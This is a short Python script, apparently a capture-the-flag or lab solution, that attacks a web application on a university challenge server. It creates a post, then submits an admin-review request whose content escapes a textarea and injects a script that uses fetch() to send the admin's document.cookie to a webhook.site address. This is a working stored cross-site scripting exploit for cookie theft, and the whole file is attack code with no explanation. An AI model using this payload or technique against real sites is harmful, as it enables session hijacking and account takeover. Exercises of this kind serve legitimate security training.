import requests
import random
import string
import re

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22253"
webhook_url = "https://webhook.site/c26c9651-fb87-4c78-a9a0-b597dee9fcc1"

s = requests.Session()

data = { 'title' : ''.join(random.choices(string.ascii_lowercase, k = 5)), 'content' : 'a' }
post_link = re.findall('value=".*"', s.post(link + "/submit_post_for_review", data = data).text)[0][7:-1]
data = { 'link' : post_link, 'content' : '</textarea><script>fetch("' +  webhook_url + '?cookie="+document.cookie)</script>' }
s.post(link + "/submit_for_admin_review", data = data)